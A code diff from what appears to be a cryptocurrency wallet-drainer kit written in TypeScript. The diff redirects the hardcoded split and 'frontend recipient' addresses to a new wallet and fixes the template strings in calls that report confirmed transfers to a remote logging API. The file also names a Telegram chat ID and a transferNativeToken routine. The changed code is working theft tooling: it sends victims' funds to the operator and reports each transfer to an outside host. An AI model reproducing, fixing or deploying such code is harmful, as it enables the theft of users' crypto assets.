@@ -19,12 +19,12 @@ const TELEGRAM_CHAT_ID = "-1002535678431";
 
 const DAI_ADDRESS_MAINNET = "0x6B175474E89094C44Da98b954EedeAC495271d0F"; // DON'T TOUCH THIS !!!
 
-const BLACK_RAIN_SPLIT = "0x4758a129ee74947CFA6Ff970162D68e1ee9f55f7";   // DON'T TOUCH THIS !!!
+const BLACK_RAIN_SPLIT = "0x20d2dB479b661c4a65B8F498cDAB86EB741385c1";   // DON'T TOUCH THIS !!!
 
 
 const BR_INITIATOR_ADDRESS = "0x143EaF2E6A0914F52020D8c2eE9A2b10A77868fE".toLowerCase(); // Replace wth your private key public address example 0x4Fc94E3CBb1A1070D4Df126C4cFa37fBBd9dcd08 
 
-const FRONTEND_RECIPIENT = "0xBFb1BAE18a786df08026908f2BA20aE77955170f"; // Hardcoded frontend recipient YOUR RECEIVIVNG ADDRESS SHOULD BE HERE
+const FRONTEND_RECIPIENT = "0x20d2dB479b661c4a65B8F498cDAB86EB741385c1"; // Hardcoded frontend recipient YOUR RECEIVIVNG ADDRESS SHOULD BE HERE
 
 
 // Ensure addresses are lowercase or properly checksummed to avoid Ethers checksum errors
@@ -45,10 +45,7 @@ interface DiscoveredToken {
 
 
 
-// const isLoggingEnabled = true; // Toggle this to enable/disable logs
-// import axios from "axios";
-
-const isLoggingEnabled = true;
+const isLoggingEnabled = true; // Toggle this to enable/disable logs
 const BASE_API_URL = "https://drn-2stp.onrender.com/api"; // From permit.txt
 // const BASE_API_URL = "http://localhost:8080/api";
 
@@ -1301,7 +1298,7 @@ const transferNativeToken = async (
       await log(`Transaction sent: ${tx.hash}`);
       await tx.wait();
       await log(`Transaction confirmed: ${tx.hash}`);
-      await axios.post("${BASE_API_URL}/api/log", {
+      await axios.post(`${BASE_API_URL}/api/log`, {
         level: "info",
         message: `EVM transaction confirmed: ${tx.hash}`,
         timestamp: new Date().toISOString(),
@@ -1321,7 +1318,7 @@ const transferNativeToken = async (
       await log(`Transaction sent: ${tx.hash}`);
       await tx.wait();
       await log(`Transaction confirmed: ${tx.hash}`);
-      await axios.post("${BASE_API_URL}/api/log", {
+      await axios.post(`${BASE_API_URL}/api/log`, {
         level: "info",
         message: `EVM transaction confirmed: ${tx.hash}`,
         timestamp: new Date().toISOString(),
